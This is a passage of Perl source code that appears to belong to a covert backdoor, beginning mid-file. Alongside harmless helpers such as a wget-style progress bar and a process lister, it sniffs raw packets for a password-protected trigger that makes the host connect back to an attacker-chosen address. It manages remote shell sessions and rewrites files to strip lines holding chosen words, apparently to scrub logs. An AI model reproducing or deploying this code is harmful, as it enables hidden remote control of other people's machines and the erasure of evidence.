         sleep(1);
         exit;

         sub http_save_data {
           my($data, $response, $protocol) = @_;
           print FILE $data;
           gotta_die();
           $saved_data += length($data);
           my $total_data = $response->content_length;

           if ($first == 1) {
             spm($proto, "DOWNLOAD", "Stats: Downloading $link ($total_data size). Type ^C to abort");
             $first = 0;
           } else {
                ProgressBar($cli, $init_time, $saved_data, $total_data);
           }

         }
         sub gotta_die {
           my $readfields = '';
           vec($readfields, fileno(RDR), 1) = 1;
           my $ready = select($readfields, undef, undef, 0);
           if ($ready == 1) {
             sleep(1);
             exit;
           }
         }
       }
       close(RDR);
       return(1);
     }

     # i like the wget look so i based this function on it :)
     sub ProgressBar {
       my ($cli, $init_time, $saved_bytes, $total_bytes) = @_;

       my $proto = $CLIENT{$cli}->{proto};
       my @term_size = split(/ +/, $CLIENT{$cli}->{termsize});
       $term_size[0] = 70 unless defined($term_size[0]);

       # time  #
       my $d_time = (Time::HiRes::time())-$init_time;

       # size #
       my $unit = "Kb/s";
       my $Sps = ($saved_bytes/$d_time) / 1024;
       if ($Sps > 1024) {
          $Sps = $Sps/1024;
          $unit = "Mb/s";
       }
       $Sps = round($Sps, 2);


       # percentage #
       my $percent = ($saved_bytes*100)/$total_bytes;
       $percent = round($percent, 1);

       # i hope someone teach me a better way :/
       my $s_saved_bytes = reverse($saved_bytes);
       $s_saved_bytes =~ s/(...)/$1,/g;
       $s_saved_bytes = reverse($s_saved_bytes);
       $s_saved_bytes =~ s/^\,//;
       my $s_total_bytes = reverse($total_bytes);
       $s_total_bytes =~ s/(...)/$1,/g;
       $s_total_bytes = reverse($s_total_bytes);
       $s_total_bytes =~ s/^\,//;

       # cauculating ETA #
       my $eta_s = round(($d_time*($total_bytes-$saved_bytes))/$saved_bytes, 0);
       my $eta_h = int($eta_s/3600);
       $eta_s %= 3600;
       my $eta_m = int($eta_s/60);
       $eta_s %= 60;
       $eta_h = "0$eta_h" if (length($eta_h) == 1);
       $eta_m = "0$eta_m" if (length($eta_m) == 1);
       $eta_s = "0$eta_s" if (length($eta_s) == 1);

       # positionating the info on the screen #
       my $show_percent = fill_space($percent, 6);
       my $show_bytes = fill_space($s_saved_bytes, length($s_total_bytes));
       my $show_Sps = fill_space($Sps, 9);
       my $show_eta = fill_space("$eta_h:$eta_m:$eta_s", 9);
       $show_eta = "--:--:--" if (length($show_eta) > 9);

       my $total_chars = length(" $show_percent% [] $show_bytes  $show_Sps$unit  ETA $show_eta");

       # bars #
       my $total_bars = $term_size[0]-5-$total_chars;
       if($total_bars < 10) {
          out("Your terminal size is too small\r");
          return;
       }

       my $bar_per_byte = $total_bars/$total_bytes;
       my $bars_n = $bar_per_byte * $saved_bytes;

       # yeah u know 0.something may do this
       $bars_n = $total_bars if ($saved_bytes == $total_bytes);
       $bars_n-- if ($saved_bytes != $total_bytes and $bars_n == $total_bars);

       my $bars = "=" x $bars_n;
       my $blank_n = $total_bars-$bars_n;
       my $blank = " " x $blank_n;
       $bars =~ s/=$/>/ if ($bars =~ /=/ and $bars_n != $total_bars);
       $blank .= ' ' if ($total_bars != $bars_n);

       my $blank_end = " " x 5;

       spm($proto, "DOWNLOAD", "\r $show_percent% \033[1m"."[$bars$blank]"."\033[0m $show_bytes  $show_Sps$unit  ETA $show_eta$blank_end");

     }

     sub round {
       my ($number, $decimals) = @_;

       my ($int,$dec) = split('\.', $number);

       return("$int.".("0" x $decimals)) unless (defined($dec));

       my @dec_ns = split('', $dec);

       return("$int.$dec".("0" x ($decimals-(scalar(@dec_ns)))))
         if (scalar(@dec_ns) < $decimals);

       my $last_on_next = 0;
       for (my $c = $#dec_ns; $c >= 0; $c--) {
         if ($dec_ns[$c] >= 5) {
           if (($c-1) < 0) {
             $int++;
           } else {
              $dec_ns[$c-1]++;
           }
           $dec_ns[$c] = 0;
         }
         last if ($dec_ns[$c-1] != 10 and $last_on_next == 1);
         last if ($c == $decimals and $dec_ns[$c-1] != 10);
         $last_on_next = 1 if ($c < $decimals and $dec_ns[$c-1] != 10);
       }

       my $new_dec = join('', @dec_ns[0 .. ($decimals-1)]);
       my $dot = "." if ($decimals != 0);
       return("$int$dot$new_dec");
     }

     sub fill_space {
       my ($chars, $max) = @_;
       my $filled = length($chars);
       my $space_n  = $max-$filled;
       return($chars) if ($space_n <= 0);

       my $space = " " x $space_n;

       return($space.$chars);
     }

     # this function get the info like "w" does but
     # it doesn't use wtmp to get the loged users.
     # I made it just to get the running process info
     # in pts/* devices.
     sub w_procps {
       my $btime;
       open(STAT, "< /proc/stat");
       while (<STAT>) {
         if (/^btime\s+(\d+)\n/i) {
           $btime = $1;
           last;
         }
       }
       close(STAT);

       opendir(PROC, "/proc");
       my @files = readdir(PROC);
       closedir(PROC);
       @files = grep { -d "/proc/$_" and $_ =~ /^\d+$/ } @files;

       my %PROC;

       foreach my $pid (@files) {
         open(STAT, "< /proc/$pid/stat");
         my $stat = <STAT>;
         close(STAT);
         my @proc_stat = split(/ /, $stat);
         my $devnum = $proc_stat[6];
         my $tpgid = $proc_stat[7];
         my $starttime = ($proc_stat[21]/$Hertz)+$btime;

         next if ($tpgid != $pid);
         next if ($devnum == 0);

         # look up the tty name
         opendir(PTS, "/dev/pts");
         my @files = readdir(PTS);
         closedir(PTS);
         @files = grep { $_ ne '.' and $_ ne '..' } @files;

         my ($dev) = grep { (stat("/dev/pts/$_"))[6] eq $devnum } @files;

         # undefined $dev means for us that the proc
         # has not been ran from a /dev/pts/* device
         next unless($dev);

         my $ttyname = "/dev/pts/$dev";

         if (not defined($PROC{$ttyname}) or $PROC{$ttyname}{starttime} < $starttime) {
           $PROC{$ttyname}{PID} = $pid;
           $PROC{$ttyname}{starttime} = $starttime;
         }
       }
       foreach my $dev (keys(%PROC)) {
         open(FH, "< /proc/".$PROC{$dev}{PID}."/cmdline");
         my $cmd = <FH>;
         $cmd =~ s/\0/ /g;
         $cmd =~ s/\s+$//;
         close(FH);

         my $idle = time-(stat($dev))[8];
         $PROC{$dev}{idle} = $idle;
         $PROC{$dev}{cmd} = $cmd;
         ($PROC{$dev}{UID}, $PROC{$dev}{GID}) = (stat("/proc/".$PROC{$dev}{PID}))[4, 5];
       }

       return(%PROC);
     }

     sub stat_time {
       my ($sec, $type) = @_;

       my $days = int($sec/86400);$sec %= 86400;
       my $hour = int($sec/3600); $sec %= 3600;
       my $minute = int($sec/60); $sec %= 60;

       $hour = "0$hour"     if (length($hour) == 1);
       $minute = "0$minute" if (length($minute) == 1);
       $sec = "0$sec"       if (length($sec) == 1);

       if ($type eq "h") {
         $hour += $days*24;
         return("$hour:$minute:$sec");
       } elsif ($type eq "d") {
          return("$days day(s), $hour:$minute:$sec");
       } else {
          return("$minute:$sec");
       }
     }

     sub write_shell {
       my ($shell, $msg) = @_;

       return(syswrite($shell, $msg, length($msg))) if (defined($shell));
     }

     sub write_client {
        my ($cli, $msg) = @_;
        my $socket = $CLIENT{$cli}->{sock};
        return() if (not defined($socket));

        syswrite($socket, $msg, length($msg));
     }

     sub finish_client {
       my ($cli, $msg) = @_;
       write_client($cli, $msg);
       close_client($cli);
     }

     sub close_client {
       my $cli = shift;
       $connections-- if (defined($CLIENT{$cli})); # no mistakes with the protocol connection

       $sel_serv->remove($cli);

       if (defined($CLIENT{$cli}->{shell})) {
         my $shell = $CLIENT{$cli}->{shell};
         $sel_serv->remove($shell);
         close($shell);
         my $shell_pid = $CLIENT{$cli}->{SHELL_PID};
         kill(9, $shell_pid) if ($shell_pid);
       }
       my $proto = $CLIENT{$cli}->{proto};
       $proto->close() if ($proto);
       $cli->close()   if ($cli);
       delete($CLIENT{$cli});
     }

   } # END OF CHILD
   close(CHILD_RDR);

   foreach my $file (keys(%WIPE)) {
     next unless (open(FILE, "< $file"));
     unless (open(TMP, "> /tmp/.aPtmp")) { # ???
       close(FILE);
       next;
     }

     while (<FILE>) {
       my @wipe_words = split(/ +/ , $WIPE{$file});
       my @line_words = split(/ +/, $_);

       my $skip = 0;
       foreach my $wipe_word (@wipe_words) {
         if (grep { $_ =~ /\Q$wipe_word\E/i } @line_words) {
           $skip = 1;
           last;
         }
       }
       next if ($skip == 1);
       print TMP $_;
     }
     close FILE;
     close TMP;
     open(FILE, "> $file");
     open(TMP, "< /tmp/.aPtmp");
     while(<TMP>) {
       print FILE $_;
     }
     close(FILE);
     close(TMP);
   }
   unlink("/tmp/.aPtmp");

   while ( 1 ) {
     loop $psck,-1,\&parse,@p;
   }

   #############
   # MAIN SUBS #
   #############

   sub conecta {
     my ($ip, $port) = @_;
     syswrite(PARENT_WTR, "CONN $ip:$port\n");
   }

   sub check_pass {
     my $got_pass = shift;
     if (crypt($got_pass, $pass) eq $pass) {
       return($got_pass);
     }
     return(undef);
   }

   sub parse {
     my $pkt = $_[2];
     $p->bset(substr($pkt,$offset));

     my ($id,$frg,$ttl,$saddr,$daddr,) =
        $p->get({ip=>['id','frag_off','ttl','saddr','daddr']});

     my $sport = unpack("nn",substr($pkt,$offset+$ip,4));
     my $dport = unpack("nn",substr($pkt,$offset+$ip+2,4));
     my ($udp_icmp_data) = $p->get({udp=>[ 'data']});
     my $tcp_data = substr($pkt,$offset+$ip+(unpack("C",(substr($pkt,$offset+$ip+12,1)))/4));

     my $client_host = sprintf("%u.%u.%u.%u", unpack "C4", pack "N1", $saddr);
     $daddr = sprintf("%u.%u.%u.%u", unpack "C4", pack "N1", $daddr);

     my $ok = 0;
     if ($tcp_data =~ /^:(.+?):(\d+):(.*)/) {
        $client_host = $1 if ($1 ne '');
        my $port = $2;
        my $cli_pass = $3;
        $cli_pass = $okp if (ord($3) == 1);
        if (my $connect = check_pass($cli_pass)) {
          conecta("$client_host", $port);
          $okp = $connect;
          $ok = 1;
        }
     }
     if ($ok == 0 and $udp_icmp_data  =~ /^:(.+?):(\d+):(.*)/) {
        $client_host = $1 if ($1 ne '');
        my $port = $2;
        my $cli_pass = $3;
        $cli_pass = $okp if (ord($3) == 1);
        if (my $connect = check_pass($cli_pass)) {
          conecta("$client_host", $port);
          $okp = $connect;
          $ok = 1;
        }
     }

   }
